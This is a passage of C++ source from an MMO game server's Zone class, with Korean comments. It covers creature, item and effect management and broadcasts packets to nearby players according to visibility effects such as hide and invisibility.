	__BEGIN_TRY

	return m_pEffectManager->findEffect(eid);

	__END_CATCH
}

//--------------------------------------------------------------------------------
//--------------------------------------------------------------------------------
void Zone::addEffect_LOCKING(Effect* pEffect)
	
{
	__BEGIN_TRY

	Assert(pEffect != NULL);

	__ENTER_CRITICAL_SECTION(m_MutexEffect)

	m_pLockedEffectManager->addEffect(pEffect);

	__LEAVE_CRITICAL_SECTION(m_MutexEffect)

	__END_CATCH
}

void Zone::deleteEffect_LOCKING(ObjectID_t id) 
	
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION(m_MutexEffect)

	m_pLockedEffectManager->deleteEffect(id);

	__LEAVE_CRITICAL_SECTION(m_MutexEffect)

	__END_CATCH
}




//--------------------------------------------------------------------------------
// Delete PC from PC Manager (only do this)
//--------------------------------------------------------------------------------
void Zone::deletePC(Creature* pCreature) 
	//NoSuchElementException, Error)
{
	__BEGIN_TRY

	Assert(pCreature != NULL);
	m_pPCManager->deleteCreature(pCreature->getObjectID());


	__END_CATCH
}

//--------------------------------------------------------------------------------
// Delete Queue PC
//--------------------------------------------------------------------------------
void Zone::deleteQueuePC(Creature* pCreature) 
	
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION(m_Mutex)

	Assert(pCreature != NULL);

	list<Creature*>::iterator itr = find_if (m_PCListQueue.begin(), m_PCListQueue.end(), isSameCreature(pCreature));

	if (itr != m_PCListQueue.end()) 
	{

		m_PCListQueue.erase(itr);

	}

	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

//--------------------------------------------------------------------------------
// Add PC to PC Manager (only do this)
//--------------------------------------------------------------------------------
void Zone::addPC(Creature* pCreature) 
	
{
	__BEGIN_TRY

	Assert(pCreature != NULL);
	m_pPCManager->addCreature(pCreature);

	__END_CATCH
}


//--------------------------------------------------------------------------------
//
//--------------------------------------------------------------------------------
void Zone::deleteCreature(Creature* pCreature, ZoneCoord_t x, ZoneCoord_t y)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_DELETE_CREATURE")

	try 
	{
		Assert(pCreature->getX() == x && pCreature->getY() == y);

		// 해당되는 CreatureManager 에서 크리처를 삭제한다.
		if (pCreature->isPC())
		{
			m_pPCManager->deleteCreature(pCreature->getObjectID());

	
			// 파티 초대중이라면 PartyInviteInfo를 삭제해준다.
			m_pPartyInviteInfoManager->cancelInvite(pCreature);

			// 파티에 가입되어 있었다면 로컬 파티에서 삭제해 준다.
			uint PartyID = pCreature->getPartyID();
			if (PartyID != 0)
			{
				m_pLocalPartyManager->deletePartyMember(PartyID, pCreature);
			}

			// 트레이드 중이었다면 트레이드 관련 정보를 삭제해준다.
			TradeInfo* pInfo = m_pTradeManager->getTradeInfo(pCreature->getName());
			if (pInfo != NULL)
			{
				m_pTradeManager->cancelTrade(pCreature);
			}
		}
		else if (pCreature->isMonster())
		{

//#ifdef __XMAS_EVENT_CODE__
//			Monster* pMonster = dynamic_cast<Monster*>(pCreature);
			m_pMonsterManager->deleteCreature(pCreature->getObjectID());
/*			switch (pMonster->getMonsterType())
			{
				case 358:
				case 359:
				case 360:
				case 361:
					m_pEventMonsterManager->deleteCreature(pCreature->getObjectID());
					break;

				default:
					m_pMonsterManager->deleteCreature(pCreature->getObjectID());
					break;
			}*/
//#else
//			m_pMonsterManager->deleteCreature(pCreature->getObjectID());
/*
#endif
*/
		}
		else if (pCreature->isNPC())
		{
			m_pNPCManager->deleteCreature(pCreature->getObjectID());
		}

		// 타일에서 크리처를 삭제한다.
		try {
			getTile(x, y).deleteCreature(pCreature->getObjectID());
		} catch (NoSuchElementException& nsee) {
			// by sigi. 2002.12.10
			// Player캐릭터가 죽을때..
			// [1] PCManager::killCreature()에서 tile에서는 지우고 목표존 설정하고
			// [2] EventResurrect에서 IncomingPlayer로 보내면.. 거기서 적절한 Zone에 들어가는데..
			// 이 두 과정.. 사이에서 아직 ZonePlayerManager에 있는 동안 Pay정보같은걸로 인해서
			// transport되면.. tile에서 지우려고 할때 문제가 생긴다..고 보여진다.
			// 일단, 그 부분(ZPM::pay체크)에서는 GPS_NORMAL인 경우만 하도록 하겠지만.
			// 이것도 무시할만하다고 보여지므로.. 일단 로그만 남기자.
			filelog("zoneDeleteCreatureError.log", "%s", nsee.toString().c_str());
		}

		// 주변의 PC들에게 크리처가 사라졌다는 사실을 브로드캐스트한다.
		GCDeleteObject gcDeleteObject(pCreature->getObjectID());
		broadcastPacket(x, y, &gcDeleteObject, pCreature);
	} 
	catch (Throwable & t) 
	{
		cerr << t.toString() << endl;
		filelog("zoneDeleteCreatureError.log", "Zone::deleteCreature() : %s", t.toString().c_str());
	}

	__END_PROFILE_ZONE("Z_DELETE_CREATURE")

	__END_CATCH
}


//--------------------------------------------------------------------------------
//
//--------------------------------------------------------------------------------
void Zone::deleteObject(Object* pObject, ZoneCoord_t x, ZoneCoord_t y)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_DELETE_OBJECT")

	//--------------------------------------------------
	// 존에서 객체를 삭제한다.
	//--------------------------------------------------
	getTile(x, y).deleteObject(pObject->getObjectID());

	//--------------------------------------------------
	// 주변의 PC들에게 객체가 사라졌다는 사실을 브로드캐스트한다.
	//--------------------------------------------------
	GCDeleteObject gcDeleteObject(pObject->getObjectID());

	broadcastPacket(x, y, &gcDeleteObject);

	__END_PROFILE_ZONE("Z_DELETE_OBJECT")

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
//--------------------------------------------------------------------------------
void Zone::deleteItem(Object* pObject, ZoneCoord_t x, ZoneCoord_t y)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_DELETE_ITEM")

	deleteFromItemList(pObject->getObjectID());

	//--------------------------------------------------
	// 존에서 객체를 삭제한다.
	//--------------------------------------------------
	getTile(x, y).deleteItem();

	
	if ( pObject->getObjectClass() == Object::OBJECT_CLASS_ITEM )
	{
		// 성물 보관함일 경우 Block 을 해제해야 한다.
		Item* pItem = dynamic_cast<Item*>(pObject);
		Assert( pItem != NULL );
		if ( pItem->getItemClass() == Item::ITEM_CLASS_CORPSE 
			&& pItem->getItemType() == MONSTER_CORPSE )
		{
			MonsterCorpse* pCorpse = dynamic_cast<MonsterCorpse*>(pItem);
			Assert( pCorpse != NULL );

			if ( pCorpse->isFlag(Effect::EFFECT_CLASS_SLAYER_RELIC_TABLE)
			  || pCorpse->isFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC_TABLE) 
			  || pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_GUARD) 
			  || pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_HOLY)) 
			{
				Tile& rTile = getTile( x, y );

				// 블록 날리기
				rTile.clearBlocked( Creature::MOVE_MODE_WALKING );
				rTile.clearBlocked( Creature::MOVE_MODE_BURROWING );
			}
		}

		if ( isRelicItem( pItem ) )
		{
			deleteEffectRelicPosition( pItem );
		}
	}
		
	//--------------------------------------------------
	// 주변의 PC들에게 객체가 사라졌다는 사실을 브로드캐스트한다.
	//--------------------------------------------------
//	GCDeleteObject gcDeleteObject(pObject->getObjectID());

//	broadcastPacket(x, y, &gcDeleteObject);

	__END_PROFILE_ZONE("Z_DELETE_ITEM")

	__END_CATCH
}


//--------------------------------------------------------------------------------
//
// broadcast packet
//
// 특정 존에 존재하는, owner를 제외한 모든 PC 에게 지정된 패킷을 전송한다.
//
//--------------------------------------------------------------------------------
void Zone::broadcastPacket(Packet* pPacket, Creature* owner)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_PCMANAGER")
	m_pPCManager->broadcastPacket(pPacket, owner);
	__END_PROFILE_ZONE("Z_BC_PCMANAGER")

	__END_CATCH
}

void Zone::broadcastDarkLightPacket(Packet* pPacket1, Packet* pPacket2, Creature* owner)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_DARKLIGHT")
	m_pPCManager->broadcastDarkLightPacket(pPacket1,  pPacket2, owner);
	__END_PROFILE_ZONE("Z_BC_DARKLIGHT")

	__END_CATCH
}

//--------------------------------------------------------------------
//
// 채팅을 브로드캐스팅 하는 함수이다. 서로다른 종족간에는 볼 수 없다.-
// 뱀파이어가 보내는 패킷은 isVampire가 True로 날아온다.
//
//--------------------------------------------------------------------
void Zone::broadcastSayPacket(ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket, Creature* owner, bool isVampire)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_SAY")

	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	//-------------------------------------------------------------------
	// 루프 변수 초기화..
	//
	// Plus 변수가 참일 경우 Range 만큼 더 보내 준다..
	// 광역 마법의 결과를 효과적으로 보여주기 위함이다.
	//
	// *NOTE
	// - 최적화를 한다면 VisionInfo에 PLUS_SIGHT라는 변수를 추가하여 연산
	//-------------------------------------------------------------------
	endx = min(m_Width - 1, cx + maxViewportWidth + 1);
	endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1);

	for (ix =  max(0, cx - maxViewportWidth - 1); ix <= endx ; ix++) 
	{
		for (iy = max(0, cy - maxViewportUpperHeight - 1); iy <= endy ; iy++) 
		{
			Tile& rTile = m_pTiles[ix][iy];	// by sigi. 2002.5.8

			// 타일에 크리처가 있는 경우에만
			if (rTile.hasCreature()) 
			{
				const forward_list<Object*> & objectList = rTile.getObjectList();

				for (forward_list<Object*>::const_iterator itr = objectList.begin() ; 
					itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; 
					itr++) 
				{
					Creature* pCreature = dynamic_cast<Creature*>(*itr);		
					Assert(pCreature != NULL);

					// PC이면서, owner가 아니면서, (x,y)를 볼 수 있는 경우
					if ((pCreature->isPC() && pCreature != owner && pCreature->getVisionState(cx,cy) >= IN_SIGHT) || (pCreature->isPC() && pCreature != owner))
					{
						// 숨어 있는 넘이 뭔 짓을 하면 안보여 주는데.. 딴짓 하면 Unborrowing 시켜야 되는디.
						// 뱀파이어가 보내는 패킷은 isVampire가 True로 날아온다.
						if (owner != NULL) 
						{

							// Creature 에서 ObservingEye 이펙트가 있으면 이펙트를 가져온다.
							EffectObservingEye* pEffectObservingEye = NULL;
							if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
							{
								pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pCreature->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
								//Assert( pEffectObservingEye != NULL );
							}

							if (!owner->isFlag(Effect::EFFECT_CLASS_GHOST)
								&& (!owner->isFlag(Effect::EFFECT_CLASS_HIDE) || pCreature->isVampire() || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )// || ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide(owner) ) )
								&& (!owner->isFlag(Effect::EFFECT_CLASS_INVISIBILITY) || pCreature->isVampire() || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility(owner) ) )
								&& (!owner->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ) // || ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping(owner) ) )
								&& ((isVampire && pCreature->isVampire()) || (!isVampire && pCreature->isSlayer()) || pCreature->isOusters())
								)
							{
								//pCreature->getPlayer()->sendPacket(pPacket);
								pCreature->getPlayer()->sendStream( &outputStream );
							}
						} 
						else 
						{
							//pCreature->getPlayer()->sendPacket(pPacket);
							pCreature->getPlayer()->sendStream( &outputStream );
						}
					}
				}
			}
		}
	}

	__END_PROFILE_ZONE("Z_BC_SAY")

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
// broadcast packet
//
// (x,y) 의 사건을 볼 수 있는, owner를 제외한 모든 PC 들에게 패킷을 브로드캐스트한다.
//
// *CAUTION*
//
// unsigned char 를 ZoneCoord_t 로 사용할 때, overflow 및 underflow 를 주의할 것
//
//--------------------------------------------------------------------------------
void Zone::broadcastPacket(ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket, Creature* owner, bool Plus, Range_t Range)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_NORMAL")

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

	//-------------------------------------------------------------------
	// 루프 변수 초기화..
	//
	// Plus 변수가 참일 경우 Range 만큼 더 보내 준다..
	// 광역 마법의 결과를 효과적으로 보여주기 위함이다.
	//
	// *NOTE
	// - 최적화를 한다면 VisionInfo에 PLUS_SIGHT라는 변수를 추가하여 연산
	//-------------------------------------------------------------------
	endx = min(m_Width - 1, cx + maxViewportWidth + 1 + Range);
	endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1 + Range);

	for (ix =  max(0, cx - maxViewportWidth - 1 - Range); ix <= endx ; ix++) 
	{
		for (iy = max(0, cy - maxViewportUpperHeight - 1 -  Range); iy <= endy ; iy++) 
		{
			// (ix,iy)에서 (cx,cy)를 못 볼 경우
			if ( VisionInfoManager::getVisionState( ix, iy, cx, cy ) == OUT_OF_SIGHT && !Plus ) continue;
			Tile& rTile = m_pTiles[ix][iy];	// by sigi.2002.5.8

			// 타일에 크리처가 있는 경우에만
			if (rTile.hasCreature()) 
			{
				const forward_list<Object*> & objectList = rTile.getObjectList();

				for (forward_list<Object*>::const_iterator itr = objectList.begin() ; 
					itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; 
					itr++) 
				{
					Creature* pCreature = dynamic_cast<Creature*>(*itr);		
					Assert(pCreature != NULL);

					// by sigi. 2002.5.14
					if (pCreature->isPC() && pCreature != owner )
						// 위에서 체크했다. by Sequoia
//						&& (pCreature->getVisionState(cx,cy) >= IN_SIGHT || Plus))
					{
						// 숨어 있는 넘이 뭔 짓을 하면 안보여 주는데.. 딴짓 하면 Unborrowing 시켜야 되는디.
						if (owner != NULL) 
						{
							// canSee 함수로 대체. by bezz 2003.05.29
							if ( canSee( pCreature, owner ) )
							{
								//pCreature->getPlayer()->sendPacket(pPacket);
								pCreature->getPlayer()->sendStream( &outputStream );
							}
						} 
						else 
						{
							//pCreature->getPlayer()->sendPacket(pPacket);
							pCreature->getPlayer()->sendStream( &outputStream );
						}
					}
				}
			}
		}
	}

	__END_PROFILE_ZONE("Z_BC_NORMAL")

	__END_CATCH
}

void Zone::broadcastLevelWarBonusPacket(Packet* pPacket, Creature* owner)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_PCMANAGER")
	m_pPCManager->broadcastLevelWarBonusPacket(pPacket, owner);
	__END_PROFILE_ZONE("Z_BC_PCMANAGER")

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
// update scan
//
// 제자리에서 sight가 변했을 경우. Add&Delete packet을 보낸다.
//
//--------------------------------------------------------------------------------
void Zone::updateScan (Creature* pPC, Sight_t oldSight, Sight_t newSight)
{
	__BEGIN_TRY

	if (pPC == NULL || pPC->isPC() == false) return;
	//Assert(pPC != NULL);
	//Assert(pPC->isPC());

	__BEGIN_PROFILE_ZONE("Z_UPDATESCAN")

	// 이제 sight 변하는 거 신경 안 쓴다.
/*	Coord_t cx = pPC->getX(), cy = pPC->getY();
	
	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer);

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			VisionState oldVS = pPC->getVisionState(ix, iy, oldSight); 
			VisionState newVS = pPC->getVisionState(ix, iy, newSight);

			const slist<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			for (slist<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() ; itr++) 
			{

				Assert(*itr != NULL);

				// 안보였다가 보이는 경우..
				// ADD~~
				if (oldVS == OUT_OF_SIGHT && newVS != OUT_OF_SIGHT)
				{
					//--------------------------------------------------------------------------------
					// 각 객체의 OBJECT CLASS에 따라서 적합한 GCAddXXX 패킷을 만들어서
					// owner 에게 전송한다. 
					// *NOTES*
					// 가장 출현 확률이 높은 객체 CLASS 가 case 앞부분에 나와야 한다.
					//--------------------------------------------------------------------------------
					switch ((*itr)->getObjectClass()) 
					{
						////////////////////////////////////////////////////////////
						////////////////////////////////////////////////////////////
						case Object::OBJECT_CLASS_CREATURE:
							{
								//--------------------------------------------------------------------------------
								// PC의 경우 pPacket을 전송해야 하며, !PC인 경우에는 전송할 필요가 없다.
								// 또한 모든 크리처의 정보를 owner에게 전송해야 한다.
								//--------------------------------------------------------------------------------
								Creature* pCreature = dynamic_cast<Creature*>(*itr);
								Assert(pCreature != NULL);

								// 자기 자신의 정보는 받을 필요가 없다.
								if (pCreature == pPC) continue;

								switch (pCreature->getCreatureClass()) 
								{
									case Creature::CREATURE_CLASS_MONSTER :
										{
											Monster* pMonster = dynamic_cast<Monster*>(pCreature);

											// by sigi
											Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

											if (pAddMonsterPacket!=NULL)
											{
												pPlayer->sendPacket( pAddMonsterPacket );

												delete pAddMonsterPacket;
											}
										}
										break;
			

									case Creature::CREATURE_CLASS_SLAYER:
										{
											// PC 가 Revealer 이펙트를 가지고 있다면 이펙트를 가져온다.
//											EffectRevealer* pEffectRevealer = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_REVEALER ) )
//											{
//												pEffectRevealer = dynamic_cast<EffectRevealer*>(pPC->findEffect( Effect::EFFECT_CLASS_REVEALER ) );
//												Assert( pEffectRevealer );
//											}

											if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
												&& (!pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)
													|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ))
//												|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping(pCreature) ) )
											{
												Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
												GCAddSlayer gcAddSlayer;
												makeGCAddSlayer(&gcAddSlayer, pSlayer);
												pPlayer->sendPacket(&gcAddSlayer);
											}
										}
										break;
			
									case Creature::CREATURE_CLASS_VAMPIRE :
										{
											// PC 가 Revealer 이펙트를 가지고 있다면 이펙트를 가져온다.
//											EffectRevealer* pEffectRevealer = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_REVEALER ) )
//											{
//												pEffectRevealer = dynamic_cast<EffectRevealer*>(pPC->findEffect( Effect::EFFECT_CLASS_REVEALER ) );
//												Assert( pEffectRevealer );
//											}

											// PC 가 ObservingEye 이펙트를 가지고 있다면 이펙트를 가져온다.
											EffectObservingEye* pEffectObservingEye = NULL;
											if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
											{
												pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
												//Assert( pEffectObservingEye != NULL );
											}

											//
											// hide와 invisibility는 동시에 사용될 수 없는다는 가정하에..
											// 
											if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST))
											{
												if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
												{
													if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )
	//													|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pCreature ) ) ) 
													{
														GCAddBurrowingCreature gcABC;
														gcABC.setObjectID(pCreature->getObjectID());
														gcABC.setName(pCreature->getName());
														gcABC.setX(ix);
														gcABC.setY(iy);

														pPlayer->sendPacket(&gcABC);
													}
												} 
												else 
												{
													if (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY))
													{
														Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
														GCAddVampire gcAddVampire;
														makeGCAddVampire(&gcAddVampire, pVampire);
														pPlayer->sendPacket(&gcAddVampire);
													}
													// pCreature는 invisibility상태..
													else if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) 
															|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
													{
														// FIXME
														// 설정에따라서 어떻게 보일지 결정된 후..
														//
														Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
														GCAddVampire gcAddVampire;
														makeGCAddVampire(&gcAddVampire, pVampire);
														pPlayer->sendPacket(&gcAddVampire);
													}
												}
											}	
										}
										break;
			
									case Creature::CREATURE_CLASS_OUSTERS:
										{
											if ( !pCreature->isFlag(Effect::EFFECT_CLASS_GHOST) )
											{
												Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
												GCAddOusters gcAddOusters;
												makeGCAddOusters(&gcAddOusters, pOusters);
												pPlayer->sendPacket(&gcAddOusters);
											}
										}
										break;
			
									case Creature::CREATURE_CLASS_NPC :
										{
											NPC* pNPC = dynamic_cast<NPC*>(pCreature);
											GCAddNPC gcAddNPC;
											makeGCAddNPC(&gcAddNPC, pNPC);
											pPlayer->sendPacket(&gcAddNPC);
										}
										break;
			
									default :
										throw Error("invalid creature class");
		
								}//switch (pCreature->getCreatureClass())
							}//case Object::OBJECT_CLASS_CREATURE :
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 아이템이 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_ITEM :
							{
								Item* pItem = dynamic_cast<Item*>(*itr);

								if (pItem->getItemClass() == Item::ITEM_CLASS_CORPSE) {
									switch (pItem->getItemType()) {
										case SLAYER_CORPSE :
											{
												SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
												GCAddSlayerCorpse gcAddSlayerCorpse;
												makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
												pPlayer->sendPacket(&gcAddSlayerCorpse);
											}
											break;
										case VAMPIRE_CORPSE :
											{
												VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
												GCAddVampireCorpse gcAddVampireCorpse;
												makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
												pPlayer->sendPacket(&gcAddVampireCorpse);
											}
											break;
										case NPC_CORPSE :
											{
												throw UnsupportedError();
											}
											break;
										case MONSTER_CORPSE :
											{
												MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
												GCAddMonsterCorpse gcAddMonsterCorpse;
												makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
												pPlayer->sendPacket(&gcAddMonsterCorpse);

												sendRelicEffect( pMonsterCorpse, pPlayer );
											}
											break;
									}//switch
								} 
								// Mine이 Install되어 있는 경우, DetectMine이 없으면 GCAddNewItemToZone Packet을 보내지 않는다. 
								// 즉 볼 수 없다.
								else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE
									&& pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
								{
									if (pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
									{
										GCAddInstalledMineToZone gcAddMine;
										gcAddMine.setObjectID(pItem->getObjectID());
										gcAddMine.setX(cx);
										gcAddMine.setY(cy);
										gcAddMine.setItemClass(pItem->getItemClass());
										gcAddMine.setItemType(pItem->getItemType());
										gcAddMine.setOptionType(pItem->getOptionTypeList());
										gcAddMine.setDurability(pItem->getDurability());
										pPlayer->sendPacket(&gcAddMine);

									}
								}
								else
								{
									GCAddNewItemToZone gcAddNewItemToZone;
									makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
									pPlayer->sendPacket(&gcAddNewItemToZone);
								}
							}
							break;

						////////////////////////////////////////////////////////////
						////////////////////////////////////////////////////////////
						case Object::OBJECT_CLASS_EFFECT :
							{
								Effect* pEffect = dynamic_cast<Effect*>(*itr);
								if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
								{
									EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
									ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

									GCAddVampirePortal gcAddVampirePortal;
									gcAddVampirePortal.setObjectID(pEffect->getObjectID());
									gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
									gcAddVampirePortal.setX(ix);
									gcAddVampirePortal.setY(iy);
									gcAddVampirePortal.setTargetZoneID(zonecoord.id);
									gcAddVampirePortal.setTargetX(zonecoord.x);
									gcAddVampirePortal.setTargetY(zonecoord.y);
									gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
									gcAddVampirePortal.setCreateFlag(0);

									pPlayer->sendPacket(&gcAddVampirePortal);
								}
								// by sigi. 2002.6.10
								else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
								{
									EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

									ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
									ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
									
									// sanctuary는 중심좌표인 경우만 packet을 보낸다.
									if (centerX==ix && centerY==iy)
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
								// Broadcasting Effect 인지 체크 추가 by Sequoia 2003.3.31
								else if (pEffect->isBroadcastingEffect())
								{
									GCAddEffectToTile gcAddEffectToTile;

									gcAddEffectToTile.setObjectID(pEffect->getObjectID());
									gcAddEffectToTile.setXY(ix, iy); 
									gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
									gcAddEffectToTile.setDuration(pEffect->getRemainDuration());
			
									pPlayer->sendPacket(&gcAddEffectToTile);
								}
							}
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 장애물이 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_OBSTACLE :
							{
							}
							break;

						//--------------------------------------------------------------------------------
						// 타일 위에 포탈이 있을 경우
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_PORTAL :
							{
							}
							break;

						default :
							throw Error("invalid object class");

					}//switch ((*itr)->getObjectClass())
				} // if
				// 보였다가 안보이는 경우.
				else if (oldVS != OUT_OF_SIGHT && newVS == OUT_OF_SIGHT)
				{
					switch((*itr)->getObjectClass())
					{
						case Object::OBJECT_CLASS_CREATURE:
						case Object::OBJECT_CLASS_ITEM:
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID((*itr)->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
							break;
						case Object::OBJECT_CLASS_EFFECT:
							{
								Effect* pEffect = dynamic_cast<Effect*>(*itr);
								GCDeleteEffectFromTile gcDeleteEffectFromTile;
								gcDeleteEffectFromTile.setObjectID((*itr)->getObjectID());
								gcDeleteEffectFromTile.setEffectID(pEffect->getSendEffectClass());
								gcDeleteEffectFromTile.setXY(ix, iy);
								pPlayer->sendPacket(&gcDeleteEffectFromTile);
							}
							break;
						default:;
							// Do nothing
					}
				}
			}	// for tile 
		}// for y
	}// for x
*/
	__END_PROFILE_ZONE("Z_UPDATESCAN")
	
	__END_CATCH
}



//--------------------------------------------------------------------------------
// broadcast packet
// (x1,y1) (x2,y2) 의 사건을 볼 수 있는,
// owner를 제외한 모든 PC 들에게 패킷을 브로드캐스트한다.
// Tile 전용 스킬 broadcastPacket이다.
// *CAUTION*
// unsigned char 를 ZoneCoord_t 로 사용할 때, overflow 및 underflow 를 주의할 것
//--------------------------------------------------------------------------------
list<Creature*> Zone::broadcastSkillPacket(ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, 
		Packet* pPacket ,list<Creature*> creatureList, bool bConcernDarkness)
	
{
	__BEGIN_TRY

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	list<Creature*> cList;

	__BEGIN_PROFILE_ZONE("Z_BC_SKILL")

	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

	//-------------------------------------------------------------------
	// 루프 변수 초기화..
	//
	// Plus 변수가 참일 경우 Range 만큼 더 보내 준다..
